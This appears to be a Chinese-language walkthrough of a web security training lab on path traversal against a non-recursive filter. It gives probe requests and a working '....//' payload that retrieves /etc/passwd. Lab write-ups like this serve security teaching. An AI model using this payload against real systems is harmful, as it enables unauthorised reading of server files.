# 实验：文件路径遍历，非递归剥离遍历序列

本实验在产品图片显示功能中包含一个路径遍历漏洞。

应用程序在使用用户提供的文件名之前，会从中剥离路径遍历序列。

为了解决本实验，请检索 `/etc/passwd` 文件的内容。

## 步骤

探测
- 查看图片加载端点
    ```http
    GET /image?filename=23.jpg HTTP/2
    ```

- 尝试当前目录序列
    `./23.jpg`
    - 成功

- 尝试规范化遍历到自身的序列
    `foo/../23.jpg`
    - 失败

探测过滤
- 尝试冗余序列串
    `....//....//....//....//....//....//....//....//....//....//....//etc/passwd`
    - 成功

- 尝试不存在的规范化遍历路径
    `....//....//....//....//....//....//....//....//....//....//....//etc/foooo/....//passwd`
    - 失败
